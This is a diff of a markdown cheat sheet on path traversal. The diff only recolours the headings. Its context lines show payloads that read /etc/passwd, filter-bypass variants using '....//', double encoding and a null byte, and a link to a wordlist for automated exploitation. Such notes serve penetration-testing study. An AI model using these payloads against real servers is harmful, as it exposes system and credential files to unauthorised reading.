@@ -1,6 +1,6 @@
 # Path traversal
 
-## <mark style="color:yellow;">General info</mark>
+## <mark style="color:purple;">General info</mark>
 
 Consider
 
@@ -12,7 +12,7 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
-## <mark style="color:yellow;">Bypass defences</mark>
+## <mark style="color:purple;">Bypass defences</mark>
 
 * Elimination (strip): `../` -> `....//`
   * Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
@@ -27,7 +27,7 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 **Note**: On Windows, both `../` and `..\` are valid directory traversal sequences.
 {% endhint %}
 
-## <mark style="color:yellow;">Tips</mark>
+## <mark style="color:purple;">Tips</mark>
 
 * Don't always trust error messages
   * `GET /image?filename=/etc/passwd` -> "No such file"
@@ -37,6 +37,6 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
   * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
   * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`
 
-## <mark style="color:yellow;">Automatic exploitation</mark>
+## <mark style="color:purple;">Automatic exploitation</mark>
 
 Use intruder with this list: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt)&#x20;
